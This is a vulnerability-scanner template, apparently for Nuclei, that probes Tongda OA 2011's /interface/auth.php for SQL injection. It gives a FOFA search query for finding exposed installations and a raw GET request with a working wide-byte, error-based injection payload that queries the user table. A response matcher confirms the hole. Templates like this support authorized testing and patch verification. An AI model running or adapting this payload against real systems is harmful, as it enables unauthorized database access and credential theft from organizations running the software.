id: tongda-oa-interface-sqli

info:
  name: "通达OA auth.php 接口 SQL 注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: title="office Anywhere" && icon_hash="-759108386" && "2011"
      通达OA（Office Anywhere网络智能办公系统）由北京通达信科科技有限公司开发，为用户提供协同办公自动化服务。/interface/auth.php 接口存在SQL注入安全缺陷，攻击者可通过构造恶意请求获取数据库敏感信息。受影响版本为通达OA2011。
  tags: 通达OA

http:
- raw:
  - |
    GET /interface/auth.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1122)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23 HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - '3b712de481375'
